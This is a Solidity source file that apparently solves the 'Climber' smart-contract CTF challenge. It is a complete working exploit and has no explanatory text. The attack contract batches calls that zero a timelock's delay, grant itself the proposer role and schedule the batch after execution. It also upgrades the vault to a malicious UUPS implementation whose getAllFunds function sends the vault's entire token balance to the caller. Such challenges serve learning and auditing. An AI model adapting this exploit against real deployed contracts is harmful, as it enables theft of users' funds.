// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {ClimberTimelock} from "./ClimberTimelock.sol";
import {ClimberVault} from "./ClimberVault.sol";
import {PROPOSER_ROLE} from "./ClimberConstants.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ClimberAttack {
    ClimberTimelock public immutable timelock;
    ClimberVault public immutable vault;

    address[] targets = new address[](4);
    uint256[] values = new uint256[](4);
    bytes[] dataElements = new bytes[](4);

    constructor(address payable _timelock, address _vault) {
        timelock = ClimberTimelock(_timelock);
        vault = ClimberVault(_vault);

        bytes memory data;
        // First set the delay to 0
        targets[0] = address(timelock);
        values[0] = 0;
        data = abi.encodeWithSignature("updateDelay(uint64)", 0);
        dataElements[0] = data;

        // Upgrade the ClimberVault to the malicious implementation
        targets[1] = address(vault);
        values[1] = 0;
        data = abi.encodeWithSignature("upgradeTo(address)", address(new MaliciousImplementation()));
        dataElements[1] = data;

        // Grant proposer role to the self contract
        targets[2] = address(timelock);
        values[2] = 0;
        data = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        dataElements[2] = data;

        // Last create a proposal to avoid final revert
        targets[3] = address(this);
        values[3] = 0;
        data = abi.encodeWithSignature("differentSchedule()");
        dataElements[3] = data;
    }

    function differentSchedule() public {
        timelock.schedule(targets, values, dataElements, bytes32("bruh"));
    }

    function executeAttack() public {
        timelock.execute(targets, values, dataElements, bytes32("bruh"));
    }
}

contract MaliciousImplementation is Initializable, UUPSUpgradeable{
    address private _owner;
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    constructor() {
        _disableInitializers();
    }

    function initialize() external initializer {
        __UUPSUpgradeable_init();
    }
    function getAllFunds(address token) external {
        SafeTransferLib.safeTransfer(token, msg.sender, IERC20(token).balanceOf(address(this)));
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}